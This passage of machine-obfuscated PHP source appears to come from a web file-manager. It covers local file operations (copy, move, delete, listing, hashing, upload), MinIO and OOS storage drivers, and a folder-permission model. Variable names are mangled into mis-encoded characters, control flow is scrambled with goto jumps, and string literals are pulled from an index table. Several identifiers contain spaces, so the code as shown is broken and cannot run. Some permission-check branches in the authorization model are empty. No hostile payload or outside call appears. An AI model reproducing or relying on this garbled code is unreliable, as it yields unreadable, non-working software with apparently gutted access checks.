$E°¼ºø¤­ = @copy($AÂ¯¯ËÈÉÌ, $d¢¹õˆºöö); return $E°¼ºø¤­ ? $this->getPathOuter($d¢¹õˆºöö) : !1; } public function moveFile($f¦ì‡à©¿, $Cö…¨ôœÆ·) { $this->mkdir($this->pathFather($Cö…¨ôœÆ·)); $f¦ì‡à©¿ = $this->iconvSystem($f¦ì‡à©¿); $Cö…¨ôœÆ· = $this->iconvSystem($Cö…¨ôœÆ·); $eœ¼Êñßïƒ = intval(@rename($f¦ì‡à©¿, $Cö…¨ôœÆ·)); if (!$eœ¼Êñßïƒ) { if ($eœ¼Êñßïƒ = intval(@copy($f¦ì‡à©¿, $Cö…¨ôœÆ·))) { @unlink($f¦ì‡à©¿); } } return $eœ¼Êñßïƒ ? $this->getPathOuter($Cö…¨ôœÆ·) : !1; } public function delFile($EÛÔÚ®±Ü) { $EÛÔÚ®±Ü = $this->iconvSystem($EÛÔÚ®±Ü); if (!@unlink($EÛÔÚ®±Ü)) { @chmod($EÛÔÚ®±Ü, 511); if (!@unlink($EÛÔÚ®±Ü)) { return !1; } } else { return !0; } } public function delFolder($a´Ã›êö) { goto c’àî³™È©; c’àî³™È©: $eÈ½’øóËà =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a´Ã›êö = $this->iconvSystem($a´Ã›êö); if (!is_dir($a´Ã›êö)) { return !0; } goto CË´À¯‹“; CË´À¯‹“: if (!($D‰òŠÍõƒ = opendir($a´Ã›êö))) { return !1; } while (($D¢Œ…îËÔ™ = readdir($D‰òŠÍõƒ)) !== !1) { if ($D¢Œ…îËÔ™ == $eÈ½’øóËà[91] || $D¢Œ…îËÔ™ == $eÈ½’øóËà[1169]) { continue; } $f‡ñÆ‡„ÃÉ = $a´Ã›êö . $eÈ½’øóËà[8] . $D¢Œ…îËÔ™; if (is_file($f‡ñÆ‡„ÃÉ) || is_link($f‡ñÆ‡„ÃÉ)) { if (!unlink($f‡ñÆ‡„ÃÉ)) { chmod($f‡ñÆ‡„ÃÉ, 511); if (!unlink($f‡ñÆ‡„ÃÉ)) { return !1; } } } else { if (is_dir($f‡ñÆ‡„ÃÉ)) { chmod($f‡ñÆ‡„ÃÉ, 511); $f‡ñÆ‡„ÃÉ = $this->iconvApp($f‡ñÆ‡„ÃÉ); if (!$this->delFolder($f‡ñÆ‡„ÃÉ)) { return !1; } } } } closedir($D‰òŠÍõƒ); goto bè‰Ô´ã”; bè‰Ô´ã”: return rmdir($a´Ã›êö); goto bÍÇ‚ªÇ±‰; bÍÇ‚ªÇ±‰: } public function rename($fº¯æÈ™÷, $f÷İù’íÅ) { goto A‚Óõ¥Àã; AŠ…“ĞÃ: $fº¯æÈ™÷ = $this->iconvSystem($fº¯æÈ™÷); $c¬ä‰Ñ“ø = $this->pathFather($fº¯æÈ™÷); $B¬¶´¼º¥ = rtrim($c¬ä‰Ñ“ø, $dŠ¼ø‹çŠ¾[8]) . $dŠ¼ø‹çŠ¾[8] . $EšØ µÒ•; goto Aö…ÇÉÕ; Aö…ÇÉÕ: $fÖŞ¹Ì­²¶ = @rename($fº¯æÈ™÷, $B¬¶´¼º¥); $B¬¶´¼º¥ = $this->iconvApp($B¬¶´¼º¥); return $fÖŞ¹Ì­²¶ ? $this->getPathOuter($B¬¶´¼º¥) : !1; goto Cä„†³Õ¦Æ; A‚Óõ¥Àã: $dŠ¼ø‹çŠ¾ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EšØ µÒ• = $this->fileNameAuto($this->pathFather($fº¯æÈ™÷), $f÷İù’íÅ); $EšØ µÒ• = $this->iconvSystem($EšØ µÒ•); goto AŠ…“ĞÃ; Cä„†³Õ¦Æ: } public function size($C ´Â¾ËÕ) { $C ´Â¾ËÕ = $this->iconvSystem($C ´Â¾ËÕ); return (double) abs(sprintf($_SERVER[´Ù×Íå‘ÄõÛ][1171], @filesize($C ´Â¾ËÕ))); } public function info($Cí¢˜—ÆÌ—) { $Cí¢˜—ÆÌ— = $this->iconvSystem($Cí¢˜—ÆÌ—); if ($this->isFolder($Cí¢˜—ÆÌ—)) { return $this->folderInfo($Cí¢˜—ÆÌ—); } else { if ($this->isFile($Cí¢˜—ÆÌ—)) { return $this->fileInfo($Cí¢˜—ÆÌ—); } } return !1; } protected function infoChildren($D³Ûàš§ÚÃ, &$c˜‘©ÜÊ‘ï, $b§âÅ¨òƒÄ = true) { goto b­­†ŠØĞ‡; DÃÜ‘Ä: if ($b§âÅ¨òƒÄ) { $D³Ûàš§ÚÃ = $this->iconvSystem($D³Ûàš§ÚÃ); } if (!($cÕÒØ±ÔÎ = @opendir($D³Ûàš§ÚÃ))) { return; } while (($d¤Õ‘¸Ö¥ = readdir($cÕÒØ±ÔÎ)) !== !1) { if ($d¤Õ‘¸Ö¥ == $d¼Òï‘Àø–[91] || $d¤Õ‘¸Ö¥ == $d¼Òï‘Àø–[1169]) { continue; } $bÀÄ¦¾ºÄ‘ = $D³Ûàš§ÚÃ . $d¤Õ‘¸Ö¥; if (is_file($bÀÄ¦¾ºÄ‘) || is_link($bÀÄ¦¾ºÄ‘)) { $c˜‘©ÜÊ‘ï[$d¼Òï‘Àø–[78]]++; $c˜‘©ÜÊ‘ï[$d¼Òï‘Àø–[77]] += (double) abs(sprintf($d¼Òï‘Àø–[1171], @filesize($bÀÄ¦¾ºÄ‘))); } else { if (is_dir($bÀÄ¦¾ºÄ‘)) { $c˜‘©ÜÊ‘ï[$d¼Òï‘Àø–[79]]++; $this->infoChildren($bÀÄ¦¾ºÄ‘, $c˜‘©ÜÊ‘ï, !1); } } } goto Fè˜Ô‘„ªš; Fè˜Ô‘„ªš: closedir($cÕÒØ±ÔÎ); goto bí‚ö¤Éññ; b­­†ŠØĞ‡: $d¼Òï‘Àø– =& $_SERVER[´Ù×Íå‘ÄõÛ]; check_abort(); $D³Ûàš§ÚÃ = rtrim($D³Ûàš§ÚÃ, $d¼Òï‘Àø–[8]) . $d¼Òï‘Àø–[8]; goto DÃÜ‘Ä; bí‚ö¤Éññ: } private function folderInfo($C‡–õÚ•¯à, $cğÈïá‘íÏ = false) { $c²İŠÁÍ‰— =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C‡–õÚ•¯à = rtrim($C‡–õÚ•¯à, $c²İŠÁÍ‰—[8]) . $c²İŠÁÍ‰—[8]; $dáÔ á×» = $this->iconvApp($this->pathThis($C‡–õÚ•¯à)); if ($cğÈïá‘íÏ) { return array($c²İŠÁÍ‰—[28] => $dáÔ á×», $c²İŠÁÍ‰—[75] => $this->getPathOuter($C‡–õÚ•¯à), $c²İŠÁÍ‰—[29] => $c²İŠÁÍ‰—[76]); } $BŞ¢¨îÈŞ = array($c²İŠÁÍ‰—[28] => $dáÔ á×», $c²İŠÁÍ‰—[75] => $this->getPathOuter($C‡–õÚ•¯à), $c²İŠÁÍ‰—[29] => $c²İŠÁÍ‰—[76], $c²İŠÁÍ‰—[187] => @filectime($C‡–õÚ•¯à), $c²İŠÁÍ‰—[107] => @filemtime($C‡–õÚ•¯à), $c²İŠÁÍ‰—[1172] => @fileatime($C‡–õÚ•¯à), $c²İŠÁÍ‰—[1166] => is_readable($C‡–õÚ•¯à), $c²İŠÁÍ‰—[1167] => is_writable($C‡–õÚ•¯à), $c²İŠÁÍ‰—[1173] => get_mode($C‡–õÚ•¯à)); return $BŞ¢¨îÈŞ; } private function fileInfo($FÇÒ—„†ç, $DÑ°àÆµŒ = false) { $a»Î²‘± =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eá„ÓÃ®×£ = $this->iconvApp($this->pathThis($FÇÒ—„†ç)); if ($DÑ°àÆµŒ) { return array($a»Î²‘±[28] => $eá„ÓÃ®×£, $a»Î²‘±[75] => $this->getPathOuter($FÇÒ—„†ç), $a»Î²‘±[29] => $a»Î²‘±[167], $a»Î²‘±[77] => $this->size($FÇÒ—„†ç), $a»Î²‘±[160] => $this->ext($eá„ÓÃ®×£)); } $dø¶Ùˆ•‹ = array($a»Î²‘±[28] => $eá„ÓÃ®×£, $a»Î²‘±[75] => $this->getPathOuter($FÇÒ—„†ç), $a»Î²‘±[29] => $a»Î²‘±[167], $a»Î²‘±[187] => @filectime($FÇÒ—„†ç), $a»Î²‘±[107] => @filemtime($FÇÒ—„†ç), $a»Î²‘±[1172] => @fileatime($FÇÒ—„†ç), $a»Î²‘±[77] => $this->size($FÇÒ—„†ç), $a»Î²‘±[160] => $this->ext($eá„ÓÃ®×£), $a»Î²‘±[1166] => is_readable($FÇÒ—„†ç), $a»Î²‘±[1167] => is_writable($FÇÒ—„†ç), $a»Î²‘±[1173] => get_mode($FÇÒ—„†ç)); return $dø¶Ùˆ•‹; } public function exist($fº¬ÁÅõòÆ) { $fº¬ÁÅõòÆ = $this->iconvSystem($fº¬ÁÅõòÆ); return @file_exists($fº¬ÁÅõòÆ); } public function isFile($D›¤¯·ï±¯) { $D›¤¯·ï±¯ = $this->iconvSystem($D›¤¯·ï±¯); return @is_file($D›¤¯·ï±¯); } public function isFolder($câƒõŠ»§–) { $câƒõŠ»§– = $this->iconvSystem($câƒõŠ»§–); return @is_dir($câƒõŠ»§–); } public function listPath($Dí…«‰ÛÁ‹, $f°‚Õ…Ë = false) { goto B •çè‡Ô÷; AÍ±Ìõí¬¡: closedir($bÇàÚÌ µã); return $C¨¼Ÿ±İŒò; goto EùÛ‘ÔÆ‘İ; Eïáµ¾î¬‰: $C¨¼Ÿ±İŒò = array($EİÍ–Üæ–¼[74] => array(), $EİÍ–Üæ–¼[73] => array()); if (!($bÇàÚÌ µã = @opendir($Dí…«‰ÛÁ‹))) { return $C¨¼Ÿ±İŒò; } while (($EîÂ‚¯ âê = readdir($bÇàÚÌ µã)) !== !1) { if ($EîÂ‚¯ âê == $EİÍ–Üæ–¼[91] || $EîÂ‚¯ âê == $EİÍ–Üæ–¼[1169]) { continue; } $eô°Š§¹‡× = $Dí…«‰ÛÁ‹ . $EîÂ‚¯ âê; if (is_file($eô°Š§¹‡×)) { $C¨¼Ÿ±İŒò[$EİÍ–Üæ–¼[73]][] = $this->fileInfo($eô°Š§¹‡×, $f°‚Õ…Ë); } else { $C¨¼Ÿ±İŒò[$EİÍ–Üæ–¼[74]][] = $this->folderInfo($eô°Š§¹‡×, $f°‚Õ…Ë); } } goto AÍ±Ìõí¬¡; B •çè‡Ô÷: $EİÍ–Üæ–¼ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dí…«‰ÛÁ‹ = $this->iconvSystem($Dí…«‰ÛÁ‹); $Dí…«‰ÛÁ‹ = rtrim($Dí…«‰ÛÁ‹, $EİÍ–Üæ–¼[8]) . $EİÍ–Üæ–¼[8]; goto Eïáµ¾î¬‰; EùÛ‘ÔÆ‘İ: } public function listAll($E“´à¨Á›, &$bİä¬ËÏ¬‰ = array()) { goto fƒ±‹Š‘¡Â; fƒ±‹Š‘¡Â: $eøÊÔà„‚† =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E“´à¨Á› = $this->iconvSystem($E“´à¨Á›); $E“´à¨Á› = rtrim($E“´à¨Á›, $eøÊÔà„‚†[8]) . $eøÊÔà„‚†[8]; goto cğğ°ÏƒÚº; d²–ÍáŞá : return $bİä¬ËÏ¬‰; goto DÅ»ï÷§Ë¯; cğğ°ÏƒÚº: if (!($b÷—›–±« = @opendir($E“´à¨Á›))) { return $bİä¬ËÏ¬‰; } while (($e¿÷™¾‰ÅÓ = readdir($b÷—›–±«)) !== !1) { if ($e¿÷™¾‰ÅÓ == $eøÊÔà„‚†[91] || $e¿÷™¾‰ÅÓ == $eøÊÔà„‚†[1169]) { continue; } $DŠğ¥ªÈ‹ = $E“´à¨Á› . $e¿÷™¾‰ÅÓ; if (is_dir($DŠğ¥ªÈ‹) && !is_link($DŠğ¥ªÈ‹)) { $bİä¬ËÏ¬‰[] = array($eøÊÔà„‚†[75] => $DŠğ¥ªÈ‹ . $eøÊÔà„‚†[8], $eøÊÔà„‚†[76] => 1, $eøÊÔà„‚†[107] => @filemtime($DŠğ¥ªÈ‹), $eøÊÔà„‚†[77] => 0); $this->listAll($DŠğ¥ªÈ‹, $bİä¬ËÏ¬‰); } else { $bİä¬ËÏ¬‰[] = array($eøÊÔà„‚†[75] => $DŠğ¥ªÈ‹, $eøÊÔà„‚†[76] => 0, $eøÊÔà„‚†[107] => @filemtime($DŠğ¥ªÈ‹), $eøÊÔà„‚†[77] => $this->size($DŠğ¥ªÈ‹)); } } closedir($b÷—›–±«); goto d²–ÍáŞá ; DÅ»ï÷§Ë¯: } public function has($aÍ¾Èšƒ°, $B®ÒôÂãÂ = false, $DŠ…ºÁƒñ› = true) { goto eçÍ»ÏÌè; A‡±Û¢Æ—‘: if ($B®ÒôÂãÂ) { return array($E¶ï÷¤Ô”°[191] => $Ašôñ´öÜ¡, $E¶ï÷¤Ô”°[192] => $c©¡ø’öæ¼); } return !1; goto d“´ëëßÍò; eçÍ»ÏÌè: $E¶ï÷¤Ô”° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÍ¾Èšƒ° = $this->iconvSystem($aÍ¾Èšƒ°); $aÍ¾Èšƒ° = rtrim($aÍ¾Èšƒ°, $E¶ï÷¤Ô”°[8]) . $E¶ï÷¤Ô”°[8]; goto bôÙÜ¬½‹; bôÙÜ¬½‹: if (!($e·Åˆ¹é©‚ = @opendir($aÍ¾Èšƒ°))) { return !1; } $Ašôñ´öÜ¡ = 0; $c©¡ø’öæ¼ = 0; goto bÃ¸‹¾ò¯Â; bÃ¸‹¾ò¯Â: $a¯Š•«İÓ® = 0; while (($Bà×•«Œ«Í = readdir($e·Åˆ¹é©‚)) !== !1) { if ($Bà×•«Œ«Í == $E¶ï÷¤Ô”°[91] || $Bà×•«Œ«Í == $E¶ï÷¤Ô”°[1169]) { continue; } $AŞ˜¬ó°¸å = $aÍ¾Èšƒ° . $Bà×•«Œ«Í; if ($B®ÒôÂãÂ) { $a¯Š•«İÓ®++; if (@is_file($AŞ˜¬ó°¸å)) { $Ašôñ´öÜ¡++; } else { $c©¡ø’öæ¼++; } if ($a¯Š•«İÓ® > 10000) { break; } continue; } if ($DŠ…ºÁƒñ›) { if (@is_file($AŞ˜¬ó°¸å)) { return !0; } } else { if (@is_dir($AŞ˜¬ó°¸å . $E¶ï÷¤Ô”°[8])) { return !0; } } } closedir($e·Åˆ¹é©‚); goto A‡±Û¢Æ—‘; d“´ëëßÍò: } public function hashSimple($BáªàãˆÄ“) { goto e¹‰èÎØ„; b—È„†õ¸: fseek($C·¾ÉìßÄÊ, $d›“ù­è… - $d›Ø¹áºòÈ); $bªÍğ¢£äà .= fread($C·¾ÉìßÄÊ, $d›Ø¹áºòÈ); fclose($C·¾ÉìßÄÊ); goto aŸ×—‰ÖÒ; aŸ×—‰ÖÒ: return md5($bªÍğ¢£äà) . $d›“ù­è…; goto b½²ÓÔÙÑ; fÊ¢ÄÙ¾: $C·¾ÉìßÄÊ = fopen($BáªàãˆÄ“, $cæğ­´†‹½[1174]); if (!$C·¾ÉìßÄÊ) { return $bªÍğ¢£äà; } for ($AäŒ¥ˆÆÊÁ = 0; $AäŒ¥ˆÆÊÁ < $aô…¬ÕÀèù; $AäŒ¥ˆÆÊÁ++) { fseek($C·¾ÉìßÄÊ, $D©¸ñ—Â£‡ * $AäŒ¥ˆÆÊÁ); $bªÍğ¢£äà .= fread($C·¾ÉìßÄÊ, $d›Ø¹áºòÈ); } goto b—È„†õ¸; Cİ‚§©ŞÔ: if ($d›“ù­è… <= $d›Ø¹áºòÈ * $aô…¬ÕÀèù) { return $this->hashMd5($BáªàãˆÄ“) . $d›“ù­è…; } $bªÍğ¢£äà = $cæğ­´†‹½[33]; $D©¸ñ—Â£‡ = intval($d›“ù­è… / $aô…¬ÕÀèù); goto fÊ¢ÄÙ¾; e¹‰èÎØ„: $cæğ­´†‹½ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$BáªàãˆÄ“) { return md5($cæğ­´†‹½[33]); } $BáªàãˆÄ“ = $this->iconvSystem($BáªàãˆÄ“); goto e´äÕƒ¢İ; e´äÕƒ¢İ: $d›“ù­è… = $this->size($BáªàãˆÄ“); $d›Ø¹áºòÈ = 200; $aô…¬ÕÀèù = 50; goto Cİ‚§©ŞÔ; b½²ÓÔÙÑ: } public function getContent($AĞ·øÉ¯œˆ) { $AĞ·øÉ¯œˆ = $this->iconvSystem($AĞ·øÉ¯œˆ); return file_get_contents($AĞ·øÉ¯œˆ); } public function setContent($F¼ğİ„š²², $a“²øÓÀ©î = '') { $F¼ğİ„š²² = $this->iconvSystem($F¼ğİ„š²²); @file_put_contents($F¼ğİ„š²², $a“²øÓÀ©î, LOCK_EX); clearstatcache(); return strlen($a“²øÓÀ©î) == filesize($F¼ğİ„š²²); } public function fileSubstr($eÜ„ùôÆ¤, $e‡÷ôùğŒ = 0, $fÜ¶šÚº© = false) { goto e²ãÖ˜î²¾; AãáÌëÁˆª: if ($fÜ¶šÚº© <= 0) { return $dïØÉ¼ÆòÓ[33]; } $FÙËÓÎòÍ½ = fopen($eÜ„ùôÆ¤, $dïØÉ¼ÆòÓ[1174]); if (!$FÙËÓÎòÍ½) { return !1; } goto D’Óİ¯ªÔ; E¸òƒ¸„ÂÜ: return $cà‘¦õ§¬–; goto d¼ÓÖ–¾ƒí; e²ãÖ˜î²¾: $dïØÉ¼ÆòÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÜ„ùôÆ¤ = $this->iconvSystem($eÜ„ùôÆ¤); if ($fÜ¶šÚº© === !1) { $fÜ¶šÚº© = $this->size($eÜ„ùôÆ¤); } goto AãáÌëÁˆª; D’Óİ¯ªÔ: fseek($FÙËÓÎòÍ½, $e‡÷ôùğŒ); $cà‘¦õ§¬– = fread($FÙËÓÎòÍ½, $fÜ¶šÚº©); fclose($FÙËÓÎòÍ½); goto E¸òƒ¸„ÂÜ; d¼ÓÖ–¾ƒí: } public function upload($Bé¿–·Äì, $EéºíãœŠ…, $bİâ‡¸µ–ë = false, $FöÅ‰·Õ„™ = REPEAT_REPLACE) { $a¼Ùôä = $this->copyFile($EéºíãœŠ…, $Bé¿–·Äì); return $a¼Ùôä ? $this->getPathOuter($Bé¿–·Äì) : !1; } public function setModifyTime($E§óõ¾Â±Ä, $F…¨¬‚‚õ = '') { @touch($E§óõ¾Â±Ä, intval($F…¨¬‚‚õ)); } public function download($bÏø¶ˆ‡¤ƒ, $D«Ì„Éò…Ñ) { return $this->iconvSystem($bÏø¶ˆ‡¤ƒ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Cù„åÓ§îÇ) { parent::__construct($Cù„åÓ§îÇ); $this->signatureVersion($_SERVER[´Ù×Íå‘ÄõÛ][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($D–ŞÕÈÌƒË) { parent::__construct($D–ŞÕÈÌƒË); $this->signatureVersion($_SERVER[´Ù×Íå‘ÄõÛ][200]); } public function fileOutLink($F¿Ù¨±¨‰) { $C‘ˆ§ï¬‘ò =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (substr($F¿Ù¨±¨‰, 0, 7) == $C‘ˆ§ï¬‘ò[1119]) { $F¿Ù¨±¨‰ = $C‘ˆ§ï¬‘ò[1120] . substr($F¿Ù¨±¨‰, 7); } header($C‘ˆ§ï¬‘ò[156] . $F¿Ù¨±¨‰); die; } } goto E•Â¢Ô¸Ä; A¶è§ÒÇÃ‚: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\162\143\x65\x5f\x61\165\x74\150"; public function getAuth($DÛ·ÓÁŸˆ—) { goto EÏÕÈË‘¼Ã; EÏÕÈË‘¼Ã: $a¬±©¶Õïó =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B¹À‚»ã = $a¬±©¶Õïó[2274]; $F¸—ö‹‘ˆ„ = array($a¬±©¶Õïó[369] => $DÛ·ÓÁŸˆ—); goto FÓÚê·â; FÓÚê·â: $Aô”‚Ì¶ß = $this->field($B¹À‚»ã)->order($a¬±©¶Õïó[367])->where($F¸—ö‹‘ˆ„)->select(); $c­Ü°Åé“¶ = array(); foreach ($Aô”‚Ì¶ß as $e¨éá‹•¢“) { if (Model($a¬±©¶Õïó[2275])->listData($e¨éá‹•¢“[$a¬±©¶Õïó[2256]])) { $c­Ü°Åé“¶[] = $e¨éá‹•¢“; } } goto EÔ‰ŞÚƒ‰æ; EÔ‰ŞÚƒ‰æ: return $c­Ü°Åé“¶; goto bĞ´áì’°™; bĞ´áì’°™: } public function setAuth($aù´‹ÇâÊõ, $bÛÆ„ÖÁ‹ï) { goto FóïÙ»· ; c‚ÕÈºë‘“: $this->where(array($FØ¬›³³ë‘[383] => $aù´‹ÇâÊõ))->delete(); $this->addAll($fã¸È¢áåè); return !0; goto F£ò¢á•¨; c—¬¡ö„Ô: $dŞ¤°ÅÆ‚ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $fã¸È¢áåè = array(); foreach ($bÛÆ„ÖÁ‹ï as $c¿É­¼²˜Ê) { if (!in_array($c¿É­¼²˜Ê[$FØ¬›³³ë‘[371]], $dŞ¤°ÅÆ‚)) { show_json(LNG($FØ¬›³³ë‘[2276]), !1); } if ($C«»¸ô…êß != $cÃâó«ºÎ¢) { if ($c¿É­¼²˜Ê[$FØ¬›³³ë‘[371]] == SourceModel::TYPE_GROUP) { } if ($c¿É­¼²˜Ê[$FØ¬›³³ë‘[458]] != 0 && !in_array($c¿É­¼²˜Ê[$FØ¬›³³ë‘[458]], $A–š÷ä”õš)) { } } if ($c¿É­¼²˜Ê[$FØ¬›³³ë‘[458]] == 0) { $c¿É­¼²˜Ê[$FØ¬›³³ë‘[371]] = SourceModel::TYPE_USER; } $fã¸È¢áåè[] = array($FØ¬›³³ë‘[369] => $aù´‹ÇâÊõ, $FØ¬›³³ë‘[371] => intval($c¿É­¼²˜Ê[$FØ¬›³³ë‘[371]]), $FØ¬›³³ë‘[458] => intval($c¿É­¼²˜Ê[$FØ¬›³³ë‘[458]]), $FØ¬›³³ë‘[2256] => intval($c¿É­¼²˜Ê[$FØ¬›³³ë‘[2256]]) ? intval($c¿É­¼²˜Ê[$FØ¬›³³ë‘[2256]]) : 0, $FØ¬›³³ë‘[2257] => intval($c¿É­¼²˜Ê[$FØ¬›³³ë‘[2257]]) ? intval($c¿É­¼²˜Ê[$FØ¬›³³ë‘[2257]]) : -1); } goto c‚ÕÈºë‘“; FóïÙ»· : $FØ¬›³³ë‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fñŸêÉ‡ê¿ = Model($FØ¬›³³ë‘[1121])->sourceInfo($aù´‹ÇâÊõ); if ($fñŸêÉ‡ê¿[$FØ¬›³³ë‘[371]] != SourceModel::TYPE_GROUP) { return !1; } goto AÜ®ÎÚš×¼; AÜ®ÎÚš×¼: $cÃâó«ºÎ¢ = 1; $C«»¸ô…êß = $fñŸêÉ‡ê¿[$FØ¬›³³ë‘[458]]; if ($C«»¸ô…êß != $cÃâó«ºÎ¢) { $cÕ¬‘’‡ïé = array($FØ¬›³³ë‘[2112] => $C«»¸ô…êß); $A–š÷ä”õš = Model($FØ¬›³³ë‘[2191])->field($FØ¬›³³ë‘[1441])->where($cÕ¬‘’‡ïé)->select(); $A–š÷ä”õš = array_to_keyvalue($A–š÷ä”õš, $FØ¬›³³ë‘[33], $FØ¬›³³ë‘[1441]); } goto c—¬¡ö„Ô; F£ò¢á•¨: } public function authClear($BÖÉò©Å–…) { $Eƒ‘ìñ‘› =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bí¦õ©Ô„Õ = Model($Eƒ‘ìñ‘›[1121])->sourceInfo($BÖÉò©Å–…); $AˆÂÛ…®Ä = array($BÖÉò©Å–…); if ($bí¦õ©Ô„Õ[$Eƒ‘ìñ‘›[370]] == $Eƒ‘ìñ‘›[83]) { $Fô¡ËíêÀÁ = array($Eƒ‘ìñ‘›[527] => array($Eƒ‘ìñ‘›[485], $bí¦õ©Ô„Õ[$Eƒ‘ìñ‘›[461]] . $BÖÉò©Å–… . $Eƒ‘ìñ‘›[486])); $AˆÂÛ…®Ä = Model($Eƒ‘ìñ‘›[1121])->field($Eƒ‘ìñ‘›[383])->where($Fô¡ËíêÀÁ)->getField($Eƒ‘ìñ‘›[369], !0); $AˆÂÛ…®Ä[] = $BÖÉò©Å–…; } $this->where(array($Eƒ‘ìñ‘›[383] => array($Eƒ‘ìñ‘›[384], $AˆÂÛ…®Ä)))->delete(); return !0; } public function get($C«±ù†—¸ô) { $c‘éÌª““ñ = $this->getSourceList(array($C«±ù†—¸ô), !0); return $c‘éÌª““ñ[0]; } public function getSourceList($cÇ‡ß¬, $b£Æš’‹ğµ = false) { goto FÇôä°©‡÷; b„ç¬§ÄŒË: if (!$b£Æš’‹ğµ) { $CÒ¢¯Ò×½ = array($C¡»¯áÇ¶‘[383] => array($C¡»¯áÇ¶‘[384], $cÇ‡ß¬)); $b£Æš’‹ğµ = $Cğ¨Ò¯ôòÄ->field($C¡»¯áÇ¶‘[2277])->where($CÒ¢¯Ò×½)->select(); $b£Æš’‹ğµ = array_to_keyvalue($b£Æš’‹ğµ, $C¡»¯áÇ¶‘[369]); } $E“¶ÙÅçËË = $cÇ‡ß¬; foreach ($b£Æš’‹ğµ as $BâÆªŠñâ => $D¥ïïø‘¿Á) { $B…áÔáß = $Cğ¨Ò¯ôòÄ->parentLevelArray($D¥ïïø‘¿Á[$C¡»¯áÇ¶‘[461]]); $E“¶ÙÅçËË = array_merge($E“¶ÙÅçËË, $B…áÔáß, array($BâÆªŠñâ)); } goto Dô½µÓéÇˆ; dáÈšŒ”–: $CÒ¢¯Ò×½ = array($C¡»¯áÇ¶‘[383] => array($C¡»¯áÇ¶‘[384], $E“¶ÙÅçËË)); $fÛà»ÆÌ = $this->field($fÛ×ìŒæ½)->where($CÒ¢¯Ò×½)->select(); $fÛà»ÆÌ = array_to_keyvalue_group($fÛà»ÆÌ, $C¡»¯áÇ¶‘[369]); goto D­ßØÈ¯±ø; Dô½µÓéÇˆ: $E“¶ÙÅçËË = array_values(array_unique($E“¶ÙÅçËË)); if (!$E“¶ÙÅçËË) { return array(); } $fÛ×ìŒæ½ = $C¡»¯áÇ¶‘[2278]; goto dáÈšŒ”–; D­ßØÈ¯±ø: $C—³»ò¾èÊ = array(); foreach ($b£Æš’‹ğµ as $e£áéâ­¦ù => $E‡˜ôÈ é) { $C—³»ò¾èÊ[$e£áéâ­¦ù] = $this->makeSourceAuth($E‡˜ôÈ é, $fÛà»ÆÌ); } return $C—³»ò¾èÊ; goto b‰×¹Ó†½; FÇôä°©‡÷: $C¡»¯áÇ¶‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$cÇ‡ß¬) { return array(); } $Cğ¨Ò¯ôòÄ = Model($C¡»¯áÇ¶‘[1121]); goto b„ç¬§ÄŒË; b‰×¹Ó†½: } public function authDeepCheck($f‰‹áí•Ò) { goto c‰¬Œ¡‰£; c‰¬Œ¡‰£: $BÃŸá…ÛŒâ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (_get($GLOBALS, $BÃŸá…ÛŒâ[459])) { return !1; } $B‘½Ÿ‚ŒÃ = $this->makeAuthDeep(); goto c¾«Õ¥ø³ï; c¾«Õ¥ø³ï: if (!in_array($f‰‹áí•Ò, $B‘½Ÿ‚ŒÃ[$BÃŸá…ÛŒâ[2279]])) { return !1; } $E‰å–ÒÕ‰ = array(); foreach ($B‘½Ÿ‚ŒÃ[$BÃŸá…ÛŒâ[2280]] as $ağà“Œ¡£ => $DÅ‹ËÉ‡‘µ) { if (!in_array($f‰‹áí•Ò, $DÅ‹ËÉ‡‘µ)) { continue; } $E‰å–ÒÕ‰[] = $ağà“Œ¡£; } goto bé·§Ë¤¯Õ; bé·§Ë¤¯Õ: $B¨ãäÊˆİ„ = $E‰å–ÒÕ‰ ? $E‰å–ÒÕ‰[0] : $f‰‹áí•Ò; return array($BÃŸá…ÛŒâ[377] => -1, $BÃŸá…ÛŒâ[418] => array($BÃŸá…ÛŒâ[385] => $BÃŸá…ÛŒâ[1035], $BÃŸá…ÛŒâ[2118] => $BÃŸá…ÛŒâ[470], $BÃŸá…ÛŒâ[386] => LNG($BÃŸá…ÛŒâ[2281]), $BÃŸá…ÛŒâ[2130] => $BÃŸá…ÛŒâ[2282]), $BÃŸá…ÛŒâ[2283] => array($BÃŸá…ÛŒâ[388] => $BÃŸá…ÛŒâ[2284], $BÃŸá…ÛŒâ[75] => $B¨ãäÊˆİ„)); goto a¹¶ğÂ¬; a¹¶ğÂ¬: } protected function makeAuthDeep() { goto c•ÑËÇ©; DÛ‘»§“½: $b…ÅâŸóê = array(); $Eôº¥”²·Õ = array(); $E¨õéœ¶ŠÂ = array(); goto D‰¯¡£“õ; EŠè§ç—­ø: $DÀÂàˆÑÒ = Model($DùŒ±ÔôŠê[2285])->listData(); $bØ£†„¥Ê¤ = array(); foreach ($DÀÂàˆÑÒ as $D¹—ë‰ÀÕ) { if ($D¹—ë‰ÀÕ[$DùŒ±ÔôŠê[376]] == 0 && $D¹—ë‰ÀÕ[$DùŒ±ÔôŠê[2132]] == $DùŒ±ÔôŠê[83]) { $bØ£†„¥Ê¤[] = $D¹—ë‰ÀÕ[$DùŒ±ÔôŠê[367]]; } } goto d§ÏÔå‡µ; c‰…Á—¶¼®: if ($c•ºÉÅ¹—œ) { $cè±¤É²â„ = array(array($DùŒ±ÔôŠê[371] => SourceModel::TYPE_USER, $DùŒ±ÔôŠê[458] => USER_ID), array($DùŒ±ÔôŠê[371] => SourceModel::TYPE_GROUP, $DùŒ±ÔôŠê[458] => 